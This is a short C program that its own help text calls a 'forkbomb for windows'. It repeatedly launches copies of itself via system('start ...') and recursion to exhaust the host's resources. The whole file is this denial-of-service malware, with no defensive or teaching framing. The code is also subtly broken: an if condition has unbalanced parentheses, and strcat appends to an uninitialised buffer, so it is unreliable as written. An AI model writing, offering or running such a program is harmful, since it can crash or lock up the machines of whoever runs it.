#include <stdio.h>
#include <stdlib.h>
#include <stdnoreturn.h>
#include <string.h>

char * cmd;
noreturn inline static void forkbomb(void);

int main (int argc,char * argv[]) {
  if (argc != 1) {
    if (strcmp(argv[1],"-h") == 0 || strcmp(argv[1],"--help") == 0) {
      printf("This is a forkbomb for windows,\n"
             "\t-h,--help: show this help;\n"
             "\tdefault: run forkbomb.\n");
      return 4;
    }
  }
  if (cmd = malloc(sizeof(char) * (strlen(argv[0])+7)) {
    strcat(cmd,"start ");
    strcat(cmd,*argv);
    forkbomb();
  } else
    printf("Memory alloc failed.\n");
  return 1;
}

noreturn inline static void forkbomb(void) {
  system(cmd);
  forkbomb();
}
